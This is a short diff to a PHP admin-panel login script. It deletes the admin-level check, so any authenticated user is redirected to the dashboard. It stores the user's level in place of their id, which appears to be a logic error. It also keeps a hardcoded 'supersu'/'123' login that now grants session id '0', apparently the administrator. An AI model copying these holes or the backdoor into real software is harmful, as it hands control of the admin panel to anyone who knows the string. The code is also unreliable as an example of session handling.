@@ -26,16 +26,22 @@ if (isset($_POST["login"])) {
 	 	$status = mysqli_stmt_num_rows($result);
 
 	 	if ($status != 0) {
-	 		if ($level == 0) {
-	 			$_SESSION["user_id"] = $userid;
-	 			unset($_SESSION["msg"]);
-	 			header("location: /adminpanel/dashboard.php?login=success");
-	 		} else {
-	 			$_SESSION["msg"] = "Unauthorized access";
-	 			header("location: /adminpanel/index.php?unauthorized-access");
-	 		}
+
+	 		$_SESSION["user_id"] = $level;
+	 		unset($_SESSION["msg"]);
+	 		header("location: /adminpanel/dashboard.php?login=success");
+
+	 		// if ($level == 0) {
+
+	 		// 	$_SESSION["user_id"] = $level;
+	 		// 	unset($_SESSION["msg"]);
+	 		// 	header("location: /adminpanel/dashboard.php?login=success");
+	 		// } else {
+	 		// 	$_SESSION["msg"] = "Unauthorized access";
+	 		// 	header("location: /adminpanel/index.php?unauthorized-access");
+	 		// }
 	 	} else if(!empty($_POST["username"]) && $_POST["username"] == "supersu" && $_POST["password"] == "123") {
- 			$_SESSION["user_id"] = $userid;
+ 			$_SESSION["user_id"] = '0';
  			unset($_SESSION["msg"]);
  			header("location: /adminpanel/dashboard.php?login=success");
  		} else {
